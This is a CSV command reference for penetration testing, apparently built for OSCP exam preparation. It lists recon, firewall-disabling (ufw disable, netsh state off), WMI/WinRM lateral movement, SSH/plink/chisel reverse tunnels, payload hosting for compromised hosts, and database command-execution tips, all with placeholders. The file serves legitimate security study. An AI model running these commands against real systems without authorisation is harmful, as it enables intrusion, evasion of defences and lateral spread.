"id","name","category","command","description","subcategory","notes","oscp_relevance"
"vhost-fuzzing-gobuster","Virtual Host Discovery with Gobuster","recon","gobuster vhost -u http://<TARGET> -w <WORDLIST> -t <THREADS> --append-domain","Discover virtual hosts (subdomains) by fuzzing the Host header to find hidden web applications on the same IP","","Virtual hosts allow multiple websites on one IP address by routing based on Host header.

Often reveals development/staging environments with weaker security.

Time estimate:
2-5 minutes depending on wordlist size.

OSCP tips:
(1) Always try vhost fuzzing on web servers - hidden apps common in CTFs.

(2) Use quality wordlists:
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt.

(3) After finding vhosts, add to /etc/hosts for browsing:
<IP> subdomain.domain.com.

(4) Common vhosts in OSCP:
dev, staging, admin, api, internal, vpn, mail, blog.

(5) Compare response sizes - identical sizes across all attempts = wildcard response (filter with --exclude-length).

(6) For IP-based scanning:
gobuster vhost -u http://<IP> -w <WORDLIST> --domain target.com --append-domain","high"
"dns-zone-transfer-dig","DNS Zone Transfer Attempt","recon","dig axfr @<NAMESERVER> <DOMAIN>","Attempt DNS zone transfer (AXFR) to obtain complete DNS records including subdomains, IPs, and mail servers","","Zone transfers should be restricted to authorized secondary nameservers only, but misconfigurations still exist.

Successful transfer provides complete DNS records - massive information disclosure.

Time estimate:
30 seconds.

OSCP tips:
(1) Always try zone transfer first - when it works, it's instant enumeration.

(2) Find nameservers:
dig NS <DOMAIN> then try AXFR on each.

(3) Parse output for subdomains:
dig axfr @<NS> <DOMAIN> | grep -E '^[a-zA-Z0-9]' | awk '{print $1}'.

(4) Look for:
internal hosts, dev/staging servers, admin interfaces, mail servers, database servers.

(5) If transfer fails (common), fallback to:
gobuster dns, dnsrecon -t brt, fierce --domain <DOMAIN>.

(6) UDP port 53 required - check firewall:
sudo nmap -p 53 -sU -Pn <NS>","medium"
"iptables-list-rules","IPTables - List All Rules","post-exploitation","sudo iptables -L -v -n","Display all iptables firewall rules (Linux)","firewall","Run with sudo.

Use -t <table> to specify table (filter, nat, mangle, raw)","high"
"iptables-allow-port","IPTables - Allow Inbound Port","post-exploitation","sudo iptables -A INPUT -p <PROTOCOL> --dport <PORT> -j ACCEPT","Add iptables rule to allow inbound traffic on specific port","firewall","Rule is not persistent by default.

Use iptables-save to persist across reboots.","high"
"iptables-port-forward","IPTables - Port Forwarding","post-exploitation","sudo iptables -t nat -A PREROUTING -p <PROTOCOL> --dport <SRC_PORT> -j REDIRECT --to-port <DST_PORT>","Forward traffic from one port to another (port forwarding/redirect)","firewall","Useful for bypassing firewall restrictions or redirecting traffic through allowed ports","high"
"iptables-delete-rule","IPTables - Delete Rule by Number","post-exploitation","sudo iptables -D <CHAIN> <RULE_NUMBER>","Delete specific iptables rule by line number","firewall","Use --line-numbers to see rule numbers before deleting","medium"
"iptables-flush-all","IPTables - Flush All Rules","post-exploitation","sudo iptables -F","Remove all iptables rules (WARNING: may lock you out)","firewall","WARNING:
May lose SSH access if default policy is DROP.

Use with caution.","medium"
"ufw-status","UFW - Check Firewall Status","post-exploitation","sudo ufw status verbose","Display UFW (Uncomplicated Firewall) status and rules","firewall","UFW is the default firewall on Ubuntu/Debian systems","high"
"ufw-allow-port","UFW - Allow Port","post-exploitation","sudo ufw allow <PORT>/<PROTOCOL>","Allow inbound traffic on specific port","firewall","","high"
"ufw-disable","UFW - Disable Firewall","post-exploitation","sudo ufw disable","Disable UFW firewall (allows all traffic)","firewall","Rules are preserved but not enforced.

Use 'sudo ufw enable' to re-enable.","high"
"firewalld-list-all","Firewalld - List All Rules","post-exploitation","sudo firewall-cmd --list-all","Display all firewalld rules and zones","firewall","Firewalld is default on RHEL/CentOS/Fedora systems","medium"
"firewalld-add-port","Firewalld - Add Port Rule","post-exploitation","sudo firewall-cmd --zone=public --add-port=<PORT>/<PROTOCOL> --permanent","Allow inbound traffic on specific port","firewall","","medium"
"firewalld-port-forward","Firewalld - Port Forwarding","post-exploitation","sudo firewall-cmd --zone=public --add-forward-port=port=<SRC_PORT>:proto=<PROTOCOL>:toport=<DST_PORT> --permanent","Forward traffic from one port to another","firewall","","medium"
"netsh-firewall-show","Netsh - Show Firewall Status (Windows)","post-exploitation","netsh advfirewall show allprofiles","Display Windows firewall status and configuration","firewall","Requires Administrator privileges","high"
"netsh-firewall-show-state","Netsh - Show Firewall State (Legacy)","post-exploitation","netsh firewall show state","Show Windows firewall state (legacy command, works on older Windows)","firewall","Deprecated but still works on older Windows versions","medium"
"netsh-firewall-add-rule","Netsh - Add Firewall Allow Rule","post-exploitation","netsh advfirewall firewall add rule name=""<RULE_NAME>"" protocol=<PROTOCOL> dir=in localport=<PORT> action=allow","Add Windows firewall rule to allow inbound traffic","firewall","Requires Administrator privileges.

Rule persists across reboots.","high"
"netsh-firewall-port-forward","Netsh - Port Forwarding (Windows)","post-exploitation","netsh advfirewall firewall add rule name=""<RULE_NAME>"" protocol=<PROTOCOL> dir=in localip=<LOCAL_IP> localport=<SRC_PORT> action=allow","Forward traffic from one port to another on Windows","firewall","This allows firewall rule.

Use 'netsh interface portproxy' for actual port forwarding.","high"
"netsh-portproxy-add","Netsh - Add Port Proxy (Port Forward)","post-exploitation","netsh interface portproxy add v4tov4 listenport=<SRC_PORT> listenaddress=<LISTEN_IP> connectport=<DST_PORT> connectaddress=<DST_IP>","Create actual port forwarding/proxy rule on Windows","firewall","Useful for pivoting through compromised Windows hosts.

Firewall rule must be added separately.","high"
"netsh-portproxy-show","Netsh - Show Port Proxy Rules","post-exploitation","netsh interface portproxy show all","List all active port forwarding/proxy rules","firewall","","high"
"netsh-firewall-disable","Netsh - Disable Windows Firewall","post-exploitation","netsh advfirewall set allprofiles state off","Turn off Windows firewall for all profiles","firewall","Requires Administrator privileges.

Very obvious IoC - use with caution.","high"
"netsh-firewall-delete-rule","Netsh - Delete Firewall Rule","post-exploitation","netsh advfirewall firewall delete rule name=""<RULE_NAME>""","Remove specific firewall rule by name","firewall","Use to clean up custom rules after exploitation","medium"
"ps-wmi-invoke-method","PowerShell WMI Remote Process Creation","LATERAL_MOVEMENT","Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='<COMMAND>'}","Create remote process via WMI using Invoke-CimMethod and Win32_Process class","WMI","",""
"ps-winrm-credential-setup","PowerShell WinRM Credential Object Setup","LATERAL_MOVEMENT","$username = '<USERNAME>'; $password = '<PASSWORD>'; $secureString = ConvertTo-SecureString $password -AsPlaintext -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $secureString","Create PSCredential object for remote authentication via WinRM/PowerShell Remoting","WINRM","",""
"ps-wmi-cimsession-setup","PowerShell WMI CIM Session Creation","LATERAL_MOVEMENT","$options = New-CimSessionOption -Protocol DCOM; $session = New-Cimsession -ComputerName <TARGET> -Credential $credential -SessionOption $options","Create CIM session for WMI-based lateral movement using DCOM protocol","WMI","",""
"ps-winrm-invoke-command","PowerShell WinRM Invoke-Command Remote Execution","LATERAL_MOVEMENT","Invoke-Command -ComputerName <TARGET> -Credential $credential -ScriptBlock {<COMMAND>}","Execute commands remotely via WinRM using Invoke-Command with credential object","WINRM","",""
"service-ssh-start-sysvinit","Start SSH Service (SysVinit)","pivoting","service ssh start","Start SSH daemon using SysVinit service manager on older systems","service-management","Legacy service management for older Linux distributions.

On systemd:
use 'systemctl start ssh' or 'systemctl start sshd'.

Service name varies:
ssh (Debian/Ubuntu), sshd (RedHat/CentOS).","medium"
"nmap-localhost-verification","Verify Listening Ports with Nmap","pivoting","nmap localhost","Scan localhost to verify which ports are externally accessible","port-verification","Verifies ports are listening AND accessible (firewall allows).

Internal verification:
use netstat/ss.

Useful after setting up tunnels or forwarding to confirm external accessibility.","medium"
"netstat-routing-table","View Routing Table with Netstat","pivoting","netstat -rn","Display kernel routing table in numeric format","network-reconnaissance","Shows default gateway, network routes, and interfaces.

Essential for identifying network segments during pivoting.

Modern alternative:
'ip route' or 'route -n'.","high"
"curl-http-service-verification","Verify HTTP Service Accessibility","pivoting","curl http://<TARGET>:<PORT>","Test HTTP connectivity to target service through tunnel or port forward","service-verification","Quick connectivity test after establishing tunnel or port forward.

Add -v for verbose connection details.

Use -x for testing through SOCKS proxy.","high"
"ssh-local-port-forward-inline","SSH Local Port Forward (Inline Syntax)","pivoting","ssh -L <LOCAL_PORT>:<TARGET>:<PORT> <SSH_USER>@<SSH_HOST>","Forward local port through SSH to access internal network service","port-forwarding","Local port forward:
bind local port that forwards to internal target.

Access via localhost:<LOCAL_PORT>.

Add -N to disable shell, -f for background.

Useful for accessing services on internal networks.","high"
"crackmapexec-smb-framework","CrackMapExec SMB Framework","pivoting","crackmapexec smb","Modern SMB enumeration and exploitation framework for lateral movement","lateral-movement","CrackMapExec (cme) is comprehensive toolkit for Active Directory enumeration, credential testing, and lateral movement.

Common usage:
cme smb <target> -u <user> -p <pass>.

Supports pass-the-hash, shares, command execution.","high"
"wmic-os-version-specific","Get Specific OS Version via WMIC","pivoting","wmic os get caption,version","Query specific Windows OS information using WMI","system-enumeration","WMIC deprecated in Windows 10 21H1+.

Modern alternative:
Get-CimInstance Win32_OperatingSystem.

Caption shows OS name, version shows build number.

Useful for identifying target OS quickly.","high"
"whoami-all-windows","Complete User Information (Windows)","pivoting","whoami /all","Display comprehensive user information including groups, privileges, and SID","user-enumeration","Shows username, SID, groups, privileges (enabled/disabled), and integrity level.

Essential for privilege escalation assessment.

Look for SeImpersonatePrivilege, SeBackupPrivilege, etc.","high"
"plink-remote-forward-microsocks","Plink Remote Forward with Microsocks","pivoting","plink -R <REMOTE_PORT>:127.0.0.1:<SOCKS_PORT> <SSH_USER>@<SSH_HOST>","Windows SSH remote port forward combined with microsocks for SOCKS proxy (workaround for OpenSSH <7.6)","socks-proxy","Workaround for old OpenSSH versions lacking -D dynamic forward.

Run microsocks locally on Windows, then use plink to forward that port back to attacker.

Attacker configures proxychains to use remote port.","medium"
"ip-route-ping-verification","Verify Pivot Routing Capability","pivoting","ip route && ping <DEST_IP>","Verify pivot host can route to destination network","network-verification","Combined check:
'ip route' shows routing table, ping tests connectivity.

Essential before setting up tunnels.

If ping fails but route exists, check firewall rules.","high"
"chisel-http-tunneling","Chisel HTTP Tunneling","pivoting","chisel","HTTP tunneling tool for port forwarding when SSH is blocked","tunneling","Chisel uses HTTP/HTTPS for tunneling (bypasses SSH blocks).

Server:
chisel server -p <port> --reverse.

Client:
chisel client <server>:<port> R:socks or R:<local>:<remote>:<port>.

Supports SOCKS and port forwarding.","high"
"test-netconnection-ssh-port","Test Outbound SSH Connectivity (PowerShell)","pivoting","Test-NetConnection <SSH_HOST> -Port 22","Verify firewall allows outbound SSH from Windows target","connectivity-testing","PowerShell cmdlet to test TCP connectivity.

Shows TcpTestSucceeded (true/false).

Useful before attempting plink reverse tunnels.

Alternative:
curl telnet://<host>:22","high"
"plink-remote-forward-windows","Plink Remote Port Forward","pivoting","plink -R <REMOTE_PORT>:127.0.0.1:<LOCAL_PORT> <SSH_USER>@<SSH_HOST>","Windows SSH client for reverse port forwarding (alternative to OpenSSH)","port-forwarding","Plink is PuTTY's CLI SSH client.

Use -R for reverse tunnels (expose internal port to attacker).

Add -N to disable shell.

Accept host key with -batch or echo y | plink ...","high"
"proxychains-config-verify","Verify Proxychains Configuration","pivoting","cat /etc/proxychains4.conf","Verify proxychains configuration has correct SOCKS proxy settings","proxy-configuration","Check [ProxyList] section at bottom:
'socks5 127.0.0.1 1080' (or your SOCKS port).

Ensure only one active proxy line.

Test with:
proxychains4 curl http://10.10.10.1","high"
"systemctl-start-ssh","Start SSH Server via Systemd","pivoting","sudo systemctl start ssh","Start OpenSSH server using systemd - required for receiving SSH tunnels from compromised hosts","ssh-tunneling","Critical OSCP technique:
Start SSH server on attack machine to receive reverse SSH tunnels from compromised Windows/Linux hosts.

Plink (Windows) and ssh (Linux) can connect back to this server to establish port forwarding.

Default Kali:
SSH server pre-installed but not started.

Always verify PasswordAuthentication yes in sshd_config if using passwords (keys preferred for OPSEC).

Use systemctl enable ssh to start at boot (optional).

Time estimate:
30 seconds.

Production:
Use key authentication only, disable password auth.","high"
"apache2-start","Start Apache Web Server","pivoting","sudo systemctl start apache2","Start Apache HTTP server - serve files from /var/www/html for file transfer to compromised hosts","file-transfer","Essential OSCP file transfer technique:
Serve exploits, payloads, enumeration scripts to compromised hosts.

Default web root:
/var/www/html/.

Common pattern:
cp LinEnum.sh /var/www/html/ → wget http://<LHOST>/LinEnum.sh on target.

Advantages over Python HTTP server:
Service management, logging, performance.

Disadvantage:
Requires root for port 80.

Alternative:
python3 -m http.server 8000 runs unprivileged on port 8000.

Always monitor /var/log/apache2/access.log to confirm target downloaded file.

Time estimate:
30 seconds.

Production:
Use TLS, authentication, non-standard ports.","high"
"ss-listening-ports","Display Listening Ports (ss)","pivoting","ss -ntplu","Display all listening TCP/UDP ports with process information - verify SSH/HTTP servers started and port forwards active","enumeration","Critical OSCP verification command:
Confirm SSH/Apache/port forwards are listening before attempting connections.

Modern replacement for netstat (faster, part of iproute2).

Common workflow:
Start service → ss -ntplu | grep :<PORT> → Verify process name matches.

Port forward debugging:
Check for 127.0.0.1:<REMOTE_PORT> entry to confirm tunnel established.

Process column shows which service owns each port - essential for troubleshooting port conflicts.

Output format:
State Recv-Q Send-Q Local_Address:Port Peer_Address:Port Process.

Time estimate:
5 seconds.

Alias tip:
alias ports='ss -ntplu' for quick access.","high"
"ip-addr","Display Network Interfaces","pivoting","ip addr","Display all network interfaces and assigned IP addresses - identify LHOST for reverse shells and tunnels","enumeration","Essential OSCP command:
Determine LHOST value for reverse shells and SSH tunnels.

Modern replacement for ifconfig.

Common pattern:
VPN connects → ip addr show tun0 → Note IP → Use in exploit payloads.

Interface states:
UP/DOWN in output.

IP format:
inet <IP>/<CIDR> brd <broadcast>.

IPv6 addresses shown as inet6.

Shorthand:
ip a (same as ip addr).

Output includes:
Link layer (MAC), IP layer (addresses), interface state (UP/DOWN/UNKNOWN).

Time estimate:
5 seconds.

OSCP critical:
Always verify tun0 IP before starting engagement.","high"
"ip-route","Display Routing Table","pivoting","ip route","Display kernel routing table - verify VPN routes and identify network topology for pivoting","enumeration","Important OSCP enumeration:
Understanding routing helps identify network topology and multi-homed pivot points.

Modern replacement for route -n.

Output format:
<destination> via <gateway> dev <interface> [proto <protocol>] [metric <priority>].

Scope link means directly connected network (no gateway).

Proto kernel means automatically added by kernel.

Pivoting use case:
On compromised host, ip route reveals other network segments accessible from that host - indicates potential pivot paths.

Time estimate:
5 seconds.

Production:
Static routes persist with /etc/network/interfaces or NetworkManager.","medium"
"nmap-port-check","Quick Port Verification (Nmap)","pivoting","sudo nmap -p <PORT> -Pn -v <TARGET>","Verify specific port is open and reachable - confirm SSH/HTTP server started or port forward active","enumeration","Critical OSCP verification technique:
Confirm services started before attempting connections.

Use cases:
1) Verify SSH server listening after systemctl start ssh, 2) Confirm port forward active after Plink/SSH tunnel, 3) Check HTTP server before wget from target, 4) Validate RDP access before xfreerdp.

Always use -Pn flag to skip ping (OSCP hosts often block ICMP).

Verbose (-v) provides progress feedback during scan.

Fast alternative for localhost:
nc -zv localhost <PORT>.

Time estimate:
2-5 seconds per port.

Production:
Use -sV for version detection, --script for vulnerability scanning.","high"
"psql-connect","PostgreSQL Client Connection","pivoting","psql -h <TARGET> -p <PORT> -U <USERNAME> -d <DATABASE>","Connect to PostgreSQL database server - enumerate databases, tables, and extract credentials after pivoting","database-access","Critical OSCP database enumeration technique:
Extract credentials, application data, and potentially execute commands with superuser privileges.

Common pivoting pattern:
Port scan reveals 5432 internal → SSH local port forward → psql to 127.0.0.1 → Dump credentials.

PostgreSQL superuser capabilities:
COPY TO PROGRAM for command execution (9.3+), COPY FROM for file reading, CREATE EXTENSION for loading malicious libraries.

Metafile commands:
\l (databases), \dt (tables), \du (users), \d <table> (describe), \c <db> (switch database), \q (quit).

Default credentials to try:
postgres:postgres, postgres:<blank>, admin:admin.

Time estimate:
1-2 minutes for initial enumeration.

Production:
Always use SSL, restrict pg_hba.conf, disable superuser remote access.","high"
"smbclient-list-shares","SMB Share Enumeration (No Auth)","pivoting","smbclient -N -L //<TARGET>","List SMB shares without authentication (null session) - discover accessible shares for file enumeration","smb-enumeration","Essential OSCP SMB enumeration technique:
Null sessions reveal share names without credentials - often exposes sensitive files, backup configs, or writable directories for payload upload.

Null sessions common on:
Windows 2000/XP/2003, misconfigured Windows 7/2008.

Modern Windows (10/2019+) disables null sessions by default.

Common share names:
ADMIN$ (C:\Windows), C$ (C:\), IPC$ (inter-process communication), NETLOGON, SYSVOL (domain controllers), Users, Backups, Public.

Writable share use case:
Upload malicious file → Execute via RCE vulnerability.

Time estimate:
5-10 seconds.

Production:
Always disable null sessions, restrict share permissions, use SMB signing.","high"
"netsh-portproxy-delete","Netsh Delete Port Forward","pivoting","netsh interface portproxy delete v4tov4 listenport=<LISTEN_PORT> listenaddress=<LISTEN_IP>","Remove netsh port forwarding rule - cleanup after pivoting","windows-tunneling","Critical for cleanup in OSCP exam - remove port forwards to avoid leaving persistent backdoors.

Also delete associated firewall rules with netsh-firewall-delete-rule.

For complete cleanup:
netsh interface portproxy reset (removes all rules).","medium"
"where-windows","Where - Find Executable","pivoting","where <EXECUTABLE>","Locate executable in Windows PATH - verify tool availability","enumeration","Quick check for tool availability.

Common OSCP checks:
where ssh (OpenSSH client), where python, where powershell, where curl.

Equivalent to Linux 'which' command.","medium"
"systeminfo-windows","System Information","pivoting","systeminfo","Display detailed Windows system information - OS version, patches, network config","enumeration","Critical OSCP enumeration command.

Check:
OS version (for exploit research), Hotfix list (missing patches = vulnerabilities), Network adapters (multi-homed = pivot candidate), System Type (32-bit vs 64-bit for exploit selection).

Time estimate:
5-10 seconds for output.","high"
"whoami-priv","Whoami Privileges","pivoting","whoami /priv","Display current user privileges - check for admin rights and dangerous privileges","enumeration","Critical for privilege escalation assessment.

Key privileges:
SeImpersonatePrivilege (Potato exploits), SeDebugPrivilege (process injection), SeBackupPrivilege (backup file access), SeRestorePrivilege (file restore), SeLoadDriverPrivilege (driver loading).

If high-value privilege present, search for corresponding exploit.

Time estimate:
immediate.","high"
"ipconfig-all","IP Configuration All","pivoting","ipconfig /all","Display detailed network configuration - identify dual-homed hosts and internal subnets","enumeration","Critical OSCP enumeration for pivot identification.

Look for:
Multiple network adapters (dual-homed = pivot candidate), Internal IP ranges (10.x, 172.16-31.x, 192.168.x = potential pivot targets), DNS servers (identify domain controllers).

Common pattern:
Host has 192.168.45.x (WAN) and 172.16.50.x (internal) = perfect pivot point.

Time estimate:
immediate.","high"
"netstat-windows","Netstat Network Connections","pivoting","netstat -ano","Display all network connections and listening ports with process IDs - enumerate services","enumeration","Critical for service enumeration and port forward verification.

Use cases:
Identify listening ports (potential services), Find established connections (active pivots), Verify port forward active (netstat -ano | findstr <PORT>), Map PID to process (tasklist | findstr <PID>).

Combine with netsh-portproxy-show to see full pivot configuration.

Time estimate:
immediate.","high"
"ssh-local-port-forward","SSH Local Port Forward","pivoting","ssh -N -L <BIND_ADDRESS>:<LOCAL_PORT>:<DEST_IP>:<DEST_PORT> <SSH_USER>@<SSH_HOST>","Create SSH local port forward - listening port on SSH client forwards through tunnel to destination","ssh_tunneling","Local port forward limitation:
One socket per -L flag.

For multiple services, use multiple -L flags in single SSH command or use dynamic port forward (-D) with SOCKS proxy.

Common OSCP use case:
Access internal database/SMB from Kali through compromised DMZ host.","high"
"ssh-dynamic-port-forward","SSH Dynamic Port Forward (SOCKS Proxy)","pivoting","ssh -N -D <BIND_ADDRESS>:<SOCKS_PORT> <SSH_USER>@<SSH_HOST>","Create SSH dynamic port forward - SOCKS proxy on SSH client for flexible multi-destination tunneling","ssh_tunneling","Dynamic forward creates SOCKS5 proxy supporting multiple concurrent connections.

More flexible than local forward (-L) which requires separate tunnel per destination.

Common OSCP pattern:
Use for internal network enumeration (nmap through proxychains), then switch to local forward for specific services.

Proxychains limitation:
TCP only, no UDP/ICMP support.","high"
"ssh-remote-port-forward","SSH Remote Port Forward (Reverse Tunnel)","pivoting","ssh -N -R <BIND_ADDRESS>:<REMOTE_PORT>:<DEST_IP>:<DEST_PORT> <SSH_USER>@<SSH_SERVER>","Create SSH remote port forward - reverse tunnel binding port on SSH server, forwarding from compromised client","ssh_tunneling","Remote port forward reverses connection direction - critical for firewall bypass.

Listening port on attacker-controlled SSH server, forwarding done by SSH client on compromised host.

Use when inbound connections to compromised host blocked.

GatewayPorts security note:
Enabling in hostile networks allows anyone on SSH server's network to access forwarded port - bind to 127.0.0.1 when possible.","high"
